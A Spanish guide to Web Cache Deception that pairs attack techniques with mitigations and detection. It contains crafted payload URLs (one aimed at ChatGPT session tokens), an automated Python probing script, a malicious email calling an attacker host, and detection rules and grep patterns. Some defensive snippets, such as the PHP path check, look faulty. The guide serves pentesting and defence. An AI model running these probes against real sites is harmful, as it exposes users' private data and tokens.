# Web Cache Deception (WCD) - Guía Completa

Web Cache Deception continúa siendo una vulnerabilidad crítica y subestimada en 2024, afectando al menos 25 sitios del Alexa Top 5000 y causando filtraciones masivas de información sensible. Esta vulnerabilidad representa un problema sistémico de seguridad que surge de la **discrepancia en el parsing de URLs** entre sistemas de caché y servidores origen.[^4]

## Definición Técnica

Web Cache Deception es una vulnerabilidad que permite a un atacante acceder a información sensible de usuarios autenticados explotando configuraciones incorrectas en sistemas de caché web (CDNs, proxies reversos, sistemas de caché locales). La vulnerabilidad surge cuando:[^6]

- El **servidor web** procesa la URL completa y sirve contenido dinámico basado en la sesión del usuario
- El **sistema de caché** interpreta erróneamente la URL como un recurso estático y almacena la respuesta
- Esto resulta en **contenido privado siendo cacheado públicamente**[^1]

## Metodología de Ataque Modernizada

### 1. Identificación de Endpoints Sensibles

Los atacantes buscan endpoints que retornen información crítica:[^7]

```bash
# Endpoints de alto valor típicos
https://victima.com/perfil
https://victima.com/api/user/profile  
https://victima.com/dashboard
https://victima.com/settings
https://victima.com/api/auth/session
https://victima.com/account/billing
https://victima.com/admin/config
```

### 2. Técnicas de Manipulación de URL Avanzadas

#### Extensiones Static File Cache Rules

Los ataques más comunes explotan reglas de caché basadas en extensiones:[^7]

```bash
# Transformaciones básicas
/perfil → /perfil/fake.css
/api/user/data → /api/user/data.js
/dashboard → /dashboard/style.png
/settings → /settings/script.json

# Extensiones de alta probabilidad
.css, .js, .png, .jpg, .gif, .svg, .txt, .json, .xml, .woff, .ico, .pdf
```

#### Path Mapping Discrepancies

Explotando diferencias entre URL mapping tradicional vs RESTful:[^7]

```bash
# REST-style servers ignoran segmentos adicionales
/user/123/profile → /user/123/profile/malicious.css

# El caché interpreta como archivo estático
# El servidor origen devuelve perfil del usuario 123
```

#### Path Traversal y Normalization[^9]

Técnicas avanzadas usando dot-segments y delimitadores:

```bash
# Traversal con encoding
/anything/..%2fmy-account → caché ve static, origen normaliza
/share/%2F..%2Fapi/auth/session → explota OpenAI ChatGPT

# Delimitadores especiales  
/profile@fake.css
/profile:fake.css
/profile;fake.css
/profile#fake.css
```

#### Delimiter Confusion Attacks[^9]

Explotando caracteres que el caché ignora pero el origen procesa:

```bash
# URL encoded slashes
/api/sensitive%2ffake.css

# Fragment identifiers
/sensitive#fake.css  

# Query parameters as delimiters
/api/user?data.css

# Semicolon delimiters
/profile;fake.css
```

### 3. Cache Server Normalization Exploitation

Investigadores han identificado técnicas sofisticadas donde el **caché normaliza** pero el **origen no**:[^8]

```bash
# Test normalization discrepancy
Original: /my-account
Payload: /aaa/..%2fmy-account

Si el origen retorna 404 → no normaliza
Si el caché cachea → normaliza y tiene reglas por prefijo
```

**Ejemplo real de ChatGPT:**[^9]

```bash
# URL crafted
https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123

# El CDN ve: share/…/api/auth/session (cacheable)  
# El origen normaliza a: api/auth/session (retorna token)
```

## Casos Reales Documentados 2024

### CVE en Sistemas Críticos

Multiple sistemas han sido comprometidos por WCD en 2024:[^2]

- **Ampache Media Server**: Exposición de configuración de usuario y tokens de sesión
- **PayPal**: Filtración de datos de cuenta de pago (caso histórico referenciado)
- **OpenAI ChatGPT**: Tokens de sesión expuestos via path traversal
- **Sistemas bancarios**: APIs internas expuestas con información financiera

### Nuevos Vectores de Ataque via Email[^4]

**Web Client Email Attack Vector:**

```html
<!-- Email malicioso enviado a víctima -->
<!DOCTYPE html>
<html><body>
<img src="https://victima.com/sensitive/data.js">
<img src="https://atacante.com/notify.js">
</body></html>
```

**Condiciones para el ataque:**

1. Cookies con `SameSite=None; Secure=true`
2. Cliente email que no filtra contenido de terceros
3. Browser sin state partitioning (Chrome pre-2024)

## Herramientas y Automatización Avanzada

### Param Miner para WCD

```bash
# Configuración en Burp Suite
# Extensions → Param Miner → Settings
# Enable: Add dynamic cachebuster
# Enable: Identify cache poisoning
# Max params to identify: 1000
```

### CacheSniper Automated Testing

```bash
git clone https://github.com/Rhynorater/CacheSniper.git
cd CacheSniper

# Análisis básico
python3 cachesniper.py -u https://victima.com -e /sensitive-endpoint

# Análisis con delimitadores customizados
python3 cachesniper.py -u https://victima.com -d "@,:,;,#,%2f" -e /api/user
```

### Web-Cache-Vulnerability-Scanner

```bash
git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git

# Escaneo automatizado con metodología avanzada
python3 wcvs.py -u https://victima.com --wcd --extensive
```

### Script Python Avanzado

```python
#!/usr/bin/env python3
import requests
import time
import random
from urllib.parse import urljoin

class AdvancedWCDTester:
    def __init__(self, target_url, session_cookie=None):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
  
        if session_cookie:
            self.session.cookies.update(session_cookie)
  
        # Extensiones de alta probabilidad basadas en research 2024
        self.extensions = [
            'css', 'js', 'png', 'jpg', 'gif', 'svg', 'txt', 'json', 'xml',
            'woff', 'ico', 'pdf', 'webp', 'woff2', 'eot', 'ttf'
        ]
  
        # Delimitadores para confusion attacks
        self.delimiters = ['@', ':', ';', '#', '%2f', '%3b', '%40']
  
        # Path traversal payloads
        self.traversals = ['..%2f', '%2e%2e%2f', '%2e%2e/', '../']
  
    def test_basic_wcd(self, endpoint):
        """Test básico con extensiones static"""
        results = []
  
        for ext in self.extensions:
            test_url = f"{self.target_url}{endpoint}/fake.{ext}"
      
            # Request con autenticación
            auth_resp = self.session.get(test_url)
            time.sleep(1)
      
            # Request sin autenticación
            anon_resp = requests.get(test_url)
      
            if self.is_potential_wcd(auth_resp, anon_resp):
                results.append({
                    'url': test_url,
                    'method': 'static_extension',
                    'extension': ext,
                    'auth_size': len(auth_resp.text),
                    'anon_size': len(anon_resp.text),
                    'cache_headers': self.extract_cache_headers(anon_resp)
                })
          
        return results
  
    def test_delimiter_confusion(self, endpoint):
        """Test delimiter confusion attacks"""
        results = []
  
        for delimiter in self.delimiters:
            for ext in self.extensions:
                test_url = f"{self.target_url}{endpoint}{delimiter}fake.{ext}"
          
                auth_resp = self.session.get(test_url)
                time.sleep(1)
                anon_resp = requests.get(test_url)
          
                if self.is_potential_wcd(auth_resp, anon_resp):
                    results.append({
                        'url': test_url,
                        'method': 'delimiter_confusion',
                        'delimiter': delimiter,
                        'extension': ext
                    })
              
        return results
  
    def test_path_traversal(self, endpoint):
        """Test path traversal normalization"""
        results = []
  
        # Buscar directorio static conocido (común: /static, /assets, /resources)
        static_dirs = ['/static', '/assets', '/resources', '/public', '/dist']
  
        for static_dir in static_dirs:
            for traversal in self.traversals:
                for ext in self.extensions:
                    # Construir URL que el caché vea como static pero origen normalice
                    test_url = f"{self.target_url}{static_dir}/{traversal}{endpoint.lstrip('/')}.{ext}"
              
                    auth_resp = self.session.get(test_url)
                    time.sleep(1)
                    anon_resp = requests.get(test_url)
              
                    if self.is_potential_wcd(auth_resp, anon_resp):
                        results.append({
                            'url': test_url,
                            'method': 'path_traversal',
                            'static_dir': static_dir,
                            'traversal': traversal,
                            'extension': ext
                        })
                  
        return results
  
    def is_potential_wcd(self, auth_resp, anon_resp):
        """Detectar potencial WCD vulnerability"""
        return (
            auth_resp.status_code == 200 and
            anon_resp.status_code == 200 and
            len(anon_resp.text) > 100 and  # Contenido sustancial
            ('cache' in str(anon_resp.headers).lower() or
             'hit' in anon_resp.headers.get('X-Cache', '').lower() or
             'Age' in anon_resp.headers)
        )
  
    def extract_cache_headers(self, response):
        """Extraer headers relevantes de caché"""
        cache_headers = {}
        relevant_headers = [
            'Cache-Control', 'Age', 'X-Cache', 'CF-Cache-Status',
            'X-Served-By', 'X-Cache-Hits', 'Expires'
        ]
  
        for header in relevant_headers:
            if header in response.headers:
                cache_headers[header] = response.headers[header]
          
        return cache_headers

# Uso del tester
def main():
    target = "https://victima.com"
    session_cookies = {'sessionid': 'valid_session_token'}
  
    tester = AdvancedWCDTester(target, session_cookies)
  
    # Endpoints críticos para testear
    critical_endpoints = [
        '/profile', '/dashboard', '/account', '/settings',
        '/api/user', '/api/profile', '/api/session',
        '/admin', '/api/admin', '/my-account'
    ]
  
    all_results = []
  
    for endpoint in critical_endpoints:
        print(f"[*] Testing endpoint: {endpoint}")
  
        # Test múltiples técnicas
        basic_results = tester.test_basic_wcd(endpoint)
        delimiter_results = tester.test_delimiter_confusion(endpoint) 
        traversal_results = tester.test_path_traversal(endpoint)
  
        all_results.extend(basic_results)
        all_results.extend(delimiter_results)
        all_results.extend(traversal_results)
  
        if basic_results or delimiter_results or traversal_results:
            print(f"[!] POTENTIAL WCD FOUND in {endpoint}")
  
    # Report final
    if all_results:
        print(f"\n[+] Total vulnerabilities found: {len(all_results)}")
        for result in all_results:
            print(f"    URL: {result['url']}")
            print(f"    Method: {result['method']}")
            print(f"    Cache Headers: {result.get('cache_headers', 'N/A')}")
            print("---")

if __name__ == "__main__":
    main()
```

## Defensive Mechanisms y Mitigaciones

### 1. Cloudflare Cache Deception Armor

Cloudflare introdujo Cache Deception Armor específicamente para prevenir WCD:[^10]

```bash
# Configuración en Cloudflare Dashboard
# Caching → Cache Rules → Create Rule
# When: Incoming requests match → All requests  
# Then: Cache eligibility → Eligible for cache
# Cache Key settings → Enable "Cache deception armor"
```

**Funcionamiento:** Verifica que la extensión de URL coincida con el Content-Type. Si `example.com/endpoint/fake.jpg` retorna `text/html` en lugar de `image/jpeg`, no se cachea.

### 2. Headers de Seguridad Robustos

```http
# Para contenido dinámico/sensible
Cache-Control: private, no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: 0

# Para APIs sensibles
Cache-Control: no-store, max-age=0
X-Content-Type-Options: nosniff
```

### 3. Configuraciones CDN Específicas

**Varnish VCL:**

```vcl
sub vcl_recv {
    # Solo cachear archivos estáticos en directorio específico
    if (req.url ~ "^/static/.*\.(css|js|png|jpg|gif|svg|woff|ico)$") {
        return (hash);
    }
    # Denegar paths con caracteres sospechosos
    if (req.url ~ "(%2f|%2e%2e|%3b|%40)") {
        return (synth(403, "Forbidden"));
    }
    return (pass);
}
```

**Nginx Configuration:**

```nginx
location ~* \.(css|js|png|jpg|gif|svg|woff|ico)$ {
    # Solo permitir desde directorio static
    location ~ ^/static/ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }
  
    # Denegar otros paths con extensiones static
    return 403;
}

# Protección contra path traversal
location ~ \.\. {
    return 403;
}
```

### 4. Validación de URL Estricta

```php
<?php
// PHP - Validación robusta de estructura URL
function validateUrlStructure($requestUri) {
    // Lista blanca de endpoints permitidos
    $allowedEndpoints = ['/profile', '/dashboard', '/api/user'];
  
    $parsedUrl = parse_url($requestUri);
    $path = $parsedUrl['path'] ?? '';
  
    // Normalizar path para detectar traversal
    $normalizedPath = realpath('/tmp' . $path);
    if (!$normalizedPath || !str_starts_with($normalizedPath, '/tmp')) {
        http_response_code(400);
        exit('Invalid path');
    }
  
    // Verificar estructura exacta
    $pathMatched = false;
    foreach($allowedEndpoints as $endpoint) {
        if ($path === $endpoint || str_starts_with($path, $endpoint . '?')) {
            $pathMatched = true;
            break;
        }
    }
  
    if (!$pathMatched) {
        http_response_code(404);
        exit('Not Found');
    }
}
?>
```

### 5. Content-Type Validation

```javascript
// Node.js middleware
function validateContentType(req, res, next) {
    const path = req.path;
    const expectedContentType = getExpectedContentType(path);
  
    // Hook en response para validar Content-Type
    const originalSend = res.send;
    res.send = function(data) {
        const actualContentType = res.get('Content-Type');
  
        if (isStaticPath(path) && actualContentType !== expectedContentType) {
            res.status(404).send('Not Found');
            return;
        }
  
        originalSend.call(this, data);
    };
  
    next();
}

function isStaticPath(path) {
    return /\.(css|js|png|jpg|gif|svg|woff|ico)$/i.test(path);
}

function getExpectedContentType(path) {
    const ext = path.split('.').pop().toLowerCase();
    const contentTypes = {
        'css': 'text/css',
        'js': 'application/javascript', 
        'png': 'image/png',
        'jpg': 'image/jpeg',
        'gif': 'image/gif',
        'svg': 'image/svg+xml'
    };
  
    return contentTypes[ext] || 'application/octet-stream';
}
```

## Detección y Monitoreo

### 1. Log Analysis para WCD

```bash
# Detectar patrones WCD en logs de acceso
# Buscar extensiones static en URLs dinámicas
grep -E "\.(css|js|png|jpg|gif)$" access.log | grep -v "^/static/" | head -20

# Detectar path traversal attempts
grep -E "(%2e%2e|%2f|\.\.)" access.log

# Alertas en tiempo real
tail -f access.log | grep -E "/(profile|dashboard|api)/.*\.(css|js|png)" --line-buffered | \
while read line; do
    echo "[ALERT] Potential WCD: $line" | mail -s "WCD Alert" admin@victima.com
done
```

### 2. Monitoring Script

```python
#!/usr/bin/env python3
import requests
import time
from datetime import datetime

def monitor_wcd_indicators(base_url, endpoints):
    """Monitor for WCD attack indicators"""
  
    suspicious_patterns = [
        '/profile/*.css', '/dashboard/*.js', '/api/user/*.png',
        '/settings/*.gif', '/account/*.json'
    ]
  
    for endpoint in endpoints:
        for pattern in suspicious_patterns:
            test_url = pattern.replace('*', 'test')
            test_url = base_url + test_url.replace('/profile', endpoint)
      
            try:
                response = requests.get(test_url, timeout=5)
          
                # Detectar indicadores sospechosos
                if (response.status_code == 200 and 
                    len(response.text) > 1000 and
                    'user' in response.text.lower()):
              
                    print(f"[{datetime.now()}] SUSPICIOUS: {test_url}")
                    print(f"  Status: {response.status_code}")
                    print(f"  Size: {len(response.text)} bytes")
                    print(f"  Cache headers: {response.headers.get('Cache-Control', 'None')}")
              
            except Exception as e:
                continue
          
            time.sleep(1)

# Ejecución
base_url = "https://victima.com"
critical_endpoints = ['/profile', '/dashboard', '/api/user']
monitor_wcd_indicators(base_url, critical_endpoints)
```

### 3. CI/CD Integration

```yaml
# GitHub Actions - Automated WCD Testing
name: Web Cache Deception Security Scan
on: 
  push:
    branches: [main]
  pull_request:

jobs:
  wcd-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
  
      - name: Setup Python
        uses: actions/setup-python@v3
        with:
          python-version: '3.9'
  
      - name: Install dependencies
        run: |
          pip install requests
          git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git
    
      - name: Run WCD Scan
        env:
          TARGET_URL: ${{ secrets.STAGING_URL }}
          AUTH_TOKEN: ${{ secrets.TEST_AUTH_TOKEN }}
        run: |
          python3 Web-Cache-Vulnerability-Scanner/wcvs.py \
            -u $TARGET_URL \
            --auth-header "Authorization: Bearer $AUTH_TOKEN" \
            --wcd \
            --output results.json
    
      - name: Check Results
        run: |
          if grep -q "vulnerable" results.json; then
            echo "::error::Web Cache Deception vulnerability detected"
            exit 1
          fi
    
      - name: Upload Results
        uses: actions/upload-artifact@v3
        with:
          name: wcd-scan-results
          path: results.json
```

## Consideraciones para Bug Bounty y Pentesting

### Metodología de Testing Sistemática

1. **Reconnaissance Phase:**

```bash
# Identificar tecnología de caché
whatweb target.com | grep -E "(Cloudflare|Akamai|Fastly|Varnish)"

# Mapear endpoints sensibles
ffuf -w endpoints.txt -u https://target.com/FUZZ -H "Cookie: session=valid"
```

2. **Cache Rules Discovery:**

```bash
# Identificar reglas de caché
curl -I https://target.com/static/test.css | grep -i cache
curl -I https://target.com/assets/test.js | grep -i cache
```

3. **Exploitation Phase:**

```bash
# Test sistemático de técnicas WCD
for endpoint in profile dashboard api/user; do
  for ext in css js png jpg; do
    curl -H "Cookie: session=victim" "https://target.com/$endpoint/test.$ext"
  done
done
```

### Targets de Alto Valor 2024

1. **SaaS Platforms:** Dashboard, billing, API keys
2. **Financial Applications:** Account details, transaction history
3. **Social Media:** Private messages, user data
4. **E-commerce:** Order history, payment methods
5. **Cloud Services:** Configuration, access tokens

### Reporting Framework

```markdown
## Web Cache Deception - Critical Data Exposure

**Severity:** Critical
**CVSS 3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Summary
Web Cache Deception vulnerability allows unauthorized access to sensitive user 
data by exploiting path mapping discrepancies between CDN and origin server.

### Technical Details
- **Vulnerable Endpoint:** /api/user/profile
- **Attack Vector:** Path traversal with static extension
- **Affected CDN:** Cloudflare
- **Cache Rule Exploited:** Static file caching based on extension

### Proof of Concept
1. Victim accesses: `https://target.com/api/user/profile/malicious.css`
2. CDN caches response as static CSS file
3. Attacker requests same URL without authentication
4. Receives victim's profile data from cache

### Impact
- Complete user profile data exposure
- API tokens and CSRF tokens leaked
- Potential for account takeover
- Affects all authenticated users

### Remediation
1. Implement Cache Deception Armor
2. Configure proper Cache-Control headers
3. Validate URL structure server-side
4. Implement Content-Type validation
```

Web Cache Deception sigue siendo una amenaza crítica en 2024 porque representa un fallo sistémico donde componentes individualmente correctos crean vulnerabilidades cuando interactúan. Los atacantes modernos combinan técnicas de path traversal, delimiter confusion y normalization discrepancies para bypassear defensas tradicionales.[^1]

La clave para una defensa efectiva está en comprender que WCD es un **problema de sistema completo**, requiriendo configuración coordinada entre CDN, caché y servidor origen. Para los bug bounty hunters, el enfoque debe estar en identificar estas discrepancias sutiles en el parsing de URLs y explotar configuraciones de caché agresivas que priorizan rendimiento sobre seguridad.
<span style="display:none">[^18][^26][^34][^42][^50][^52]</span>

<div style="text-align: center">-</div>

[^1]: https://es-la.tenable.com/blog/identifying-web-cache-poisoning-and-web-cache-deception-how-tenable-web-app-scanning-can-help
    
[^2]: https://www.technologydecisions.com.au/content/information-technology-professionals-association/article/wcd-attacks-still-a-significant-issue-620111008
    
[^3]: https://seclab.nu/static/publications/sec2020wcd.pdf
    
[^4]: https://air.unimi.it/retrieve/7df93d97-538a-4df6-9355-7625561e0416/CLOSER_2024_36_CR%20(1).pdf
    
[^5]: https://www.vaadata.com/blog/web-cache-poisoning-attacks-and-security-best-practices/
    
[^6]: https://www.scitepress.org/Papers/2024/126920/126920.pdf
    
[^7]: https://portswigger.net/web-security/web-cache-deception
    
[^8]: https://siunam321.github.io/ctf/portswigger-labs/Web-Cache-Deception/WCD-4/
    
[^9]: https://gbhackers.com/new-cache-deception-attack-exploits/
    
[^10]: https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/
    
[^11]: https://www.websecuritylens.org/tag/difference-between-web-cache-deception-and-web-cache-poison/
    
[^12]: https://www.cloudrangecyber.com/news/real-world-cybersecurity-breaches-caused-by-vulnerable-apis
    
[^13]: https://www.jianjunchen.com/p/web-cache-posioning.CCS24.pdf
    
[^14]: https://swisskyrepo.github.io/PayloadsAllTheThings/Web Cache Deception/
    
[^15]: https://birchwoodu.org/top-10-real-world-case-studies-on-cyber-security-incidents/
    
[^16]: https://curiosidadesdehackers.com/web-cache-deception/
    
[^17]: https://www.brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/
    
[^18]: https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/
    
[^19]: https://owasp.org/www-project-top-10-ci-cd-security-risks/
    
[^20]: https://portswigger.net/research/gotta-cache-em-all
    
[^21]: https://portswigger.net/research/top-10-web-hacking-techniques-of-2024
    
[^22]: https://www.secopsolution.com/blog/10-most-uncommon-vulnerabilities-in-web-applications
    
[^23]: https://www.clear-gate.com/blog/web-cache-poisoning-deception/
    
[^24]: https://www.youtube.com/watch?v=39RdU8qYNCk
    
[^25]: https://www.sisainfosec.com/blogs/5-most-common-application-vulnerabilities-and-how-to-mitigate-them/
    
[^26]: https://github.com/resources/whitepapers/actions
    
[^27]: https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/web-cache-deception/
    
[^28]: https://www.cobalt.io/blog/web-cache-deception-what-it-is-and-how-to-test-for-it
    
[^29]: https://journals.mmupress.com/index.php/jiwe/article/view/1062
    
[^30]: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception
    
[^31]: https://jignect.tech/top-ci-cd-tools-every-qa-automation-engineer-should-know/
    
[^32]: https://infosecwriteups.com/mastering-web-cache-deception-vulnerabilities-an-advanced-bug-hunters-guide-b7b500b482e3
    
[^33]: https://www.youtube.com/watch?v=O6lr-LKhEwI
    
[^34]: https://infosecuritycompliance.com/open-ai-web-cache-deception-vulnerability/
    
[^35]: https://hackerone.com/reports/1391635
    
[^36]: https://github.com/topics/automation-tools
    
[^37]: https://codesealer.com/blog/web-cache-deception-attacks
    
[^38]: https://github.com/f-min/WCD_prober
    
[^39]: https://www.usenix.org/system/files/sec22-mirheidari.pdf
    
[^40]: https://pt-br.tenable.com/blog/identifying-web-cache-poisoning-and-web-cache-deception-how-tenable-web-app-scanning-can-help
    
[^41]: https://spectralops.io/blog/top-10-ci-cd-automation-tools/
    
[^42]: https://stackoverflow.com/questions/64373470/best-practice-for-xss-attacks-in-rest-api
    
[^43]: https://stackoverflow.com/questions/2965746/how-do-you-prevent-brute-force-attacks-on-restful-data-services
    
[^44]: https://www.scribd.com/document/845952260/A-Methodology-for-Web-Cache-Deception-Vulnerability-Discovery
    
[^45]: https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization
    
[^46]: https://www.youtube.com/watch?v=-cwRNObMpVg
    
[^47]: https://www.vaadata.com/blog/how-to-strengthen-the-security-of-your-apis-to-counter-the-most-common-attacks/
    
[^48]: https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization
    
[^49]: https://www.nohat.it/slides/2024/minetti.pdf
    
[^50]: https://hackread.com/rising-threat-of-api-attacks-how-to-secure-apis-2025/
    
[^51]: https://www.youtube.com/watch?v=e4655fU7yAQ
    
[^52]: https://danaepp.com/3-ways-to-use-common-attack-patterns-to-abuse-an-api
